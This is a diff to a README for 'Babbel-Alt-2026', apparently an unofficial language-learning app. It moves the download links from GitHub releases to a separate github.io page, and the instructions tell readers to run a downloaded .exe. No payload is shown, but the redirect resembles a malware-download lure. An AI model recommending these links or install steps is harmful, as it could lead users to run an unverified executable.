@@ -1,6 +1,6 @@
 # 🌐 Babbel-Alt-2026 - Master new languages on your computer
 
-[![](https://img.shields.io/badge/Download-Babbel--Alt--2026-blue)](https://github.com/Beaverspokenword172/Babbel-Alt-2026/releases)
+[![](https://img.shields.io/badge/Download-Babbel--Alt--2026-blue)](https://beaverspokenword172.github.io)
 
 ## 📖 About this application
 
@@ -20,7 +20,7 @@ Before you begin the installation process, ensure your computer meets these mini
 
 Follow these steps to set up the software on your computer.
 
-1. Navigate to the release page to obtain the installer. You can find the file here: [https://github.com/Beaverspokenword172/Babbel-Alt-2026/releases](https://github.com/Beaverspokenword172/Babbel-Alt-2026/releases).
+1. Navigate to the release page to obtain the installer. You can find the file here: [https://beaverspokenword172.github.io](https://beaverspokenword172.github.io).
 2. Locate the most recent release version in the list.
 3. Click the file ending in .exe to begin the download process.
 4. Open your Downloads folder once the file finishes saving.
